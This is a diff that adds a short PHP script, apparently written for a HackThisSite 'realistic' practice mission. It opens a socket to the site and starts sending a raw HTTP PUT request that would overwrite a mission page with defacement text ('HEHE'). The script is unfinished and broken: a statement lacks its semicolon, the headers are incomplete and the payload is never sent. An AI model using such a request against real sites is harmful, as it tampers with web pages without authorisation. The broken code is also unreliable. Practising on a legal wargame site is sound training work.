@@ -1,0 +1,9 @@
+<?php
+$host = "www.hackthissite.org";
+$ref = "/missions/realistic/3/";
+$data = "<h1>HEHE</h1>";
+$fp = fsockopen($host,80);
+fwrite($fp, "PUT ".$ref." HTTP/1.1\r\n");
+fwrite($fp, "Host:".$host."\r\n")
+
+?>
